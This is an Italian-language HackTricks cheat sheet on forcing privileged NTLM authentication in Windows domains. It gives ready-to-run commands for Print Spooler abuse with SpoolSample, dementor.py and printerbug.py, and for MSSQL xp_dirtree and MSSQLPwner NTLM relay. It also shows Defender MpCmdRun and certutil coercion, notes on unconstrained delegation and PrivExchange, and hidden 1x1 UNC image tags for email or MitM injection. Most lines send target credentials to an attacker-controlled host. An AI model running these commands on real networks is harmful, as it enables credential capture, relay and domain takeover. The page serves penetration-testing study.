# Forzare l'autenticazione privilegiata NTLM

{% hint style="success" %}
Impara e pratica il hacking AWS:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Impara e pratica il hacking GCP: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Supporta HackTricks</summary>

* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos su github.

</details>
{% endhint %}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) è una **collezione** di **trigger di autenticazione remota** codificati in C# utilizzando il compilatore MIDL per evitare dipendenze di terze parti.

## Abuso del servizio Spooler

Se il servizio _**Print Spooler**_ è **abilitato**, puoi utilizzare alcune credenziali AD già note per **richiedere** al server di stampa del Domain Controller un **aggiornamento** sui nuovi lavori di stampa e semplicemente dirgli di **inviare la notifica a un sistema arbitrario**.\
Nota che quando la stampante invia la notifica a sistemi arbitrari, deve **autenticarsi** contro quel **sistema**. Pertanto, un attaccante può far sì che il servizio _**Print Spooler**_ si autentichi contro un sistema arbitrario, e il servizio **utilizzerà l'account del computer** in questa autenticazione.

### Trovare server Windows nel dominio

Utilizzando PowerShell, ottieni un elenco di macchine Windows. I server sono solitamente una priorità, quindi concentriamoci lì:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Trovare i servizi Spooler in ascolto

Utilizzando una versione leggermente modificata di @mysmartlogin (Vincent Le Toux) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), verifica se il servizio Spooler è in ascolto:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Puoi anche usare rpcdump.py su Linux e cercare il protocollo MS-RPRN.
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### Chiedi al servizio di autenticarsi contro un host arbitrario

Puoi compilare[ **SpoolSample da qui**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
o usa [**dementor.py di 3xocyte**](https://github.com/NotMedic/NetNTLMtoSilverTicket) o [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) se sei su Linux
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### Combinazione con Delegazione Illimitata

Se un attaccante ha già compromesso un computer con [Delegazione Illimitata](unconstrained-delegation.md), l'attaccante potrebbe **far autenticare la stampante contro questo computer**. A causa della delegazione illimitata, il **TGT** dell'**account computer della stampante** sarà **salvato in** **memoria** del computer con delegazione illimitata. Poiché l'attaccante ha già compromesso questo host, sarà in grado di **recuperare questo ticket** e abusarne ([Pass the Ticket](pass-the-ticket.md)).

## Forzare l'autenticazione RCP

{% embed url="https://github.com/p0dalirius/Coercer" %}

## PrivExchange

L'attacco `PrivExchange` è il risultato di un difetto trovato nella **funzione `PushSubscription` di Exchange Server**. Questa funzione consente al server Exchange di essere forzato da qualsiasi utente di dominio con una casella di posta ad autenticarsi su qualsiasi host fornito dal client tramite HTTP.

Per impostazione predefinita, il **servizio Exchange viene eseguito come SYSTEM** e ha privilegi eccessivi (specificamente, ha **privilegi WriteDacl sull'aggiornamento cumulativo del dominio pre-2019**). Questo difetto può essere sfruttato per abilitare il **rilascio di informazioni a LDAP e successivamente estrarre il database NTDS del dominio**. Nei casi in cui il rilascio a LDAP non sia possibile, questo difetto può comunque essere utilizzato per rilasciare e autenticarsi su altri host all'interno del dominio. Lo sfruttamento riuscito di questo attacco concede accesso immediato all'Amministratore di Dominio con qualsiasi account utente di dominio autenticato.

## All'interno di Windows

Se sei già all'interno della macchina Windows, puoi forzare Windows a connettersi a un server utilizzando account privilegiati con:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Or use this other technique: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

È possibile utilizzare certutil.exe lolbin (binary firmato da Microsoft) per forzare l'autenticazione NTLM:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### Via email

Se conosci l'**indirizzo email** dell'utente che accede a una macchina che vuoi compromettere, potresti semplicemente inviargli un **email con un'immagine 1x1** come
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
e quando lo apre, cercherà di autenticarsi.

### MitM

Se puoi eseguire un attacco MitM su un computer e iniettare HTML in una pagina che visualizzerà, potresti provare a iniettare un'immagine come la seguente nella pagina:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Cracking NTLMv1

Se riesci a catturare [le sfide NTLMv1 leggi qui come crackerle](../ntlm/#ntlmv1-attack).\
&#xNAN;_&#x52;icorda che per crackare NTLMv1 devi impostare la sfida di Responder su "1122334455667788"_

{% hint style="success" %}
Impara e pratica il hacking AWS:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Impara e pratica il hacking GCP: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Supporta HackTricks</summary>

* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos su github.

</details>
{% endhint %}
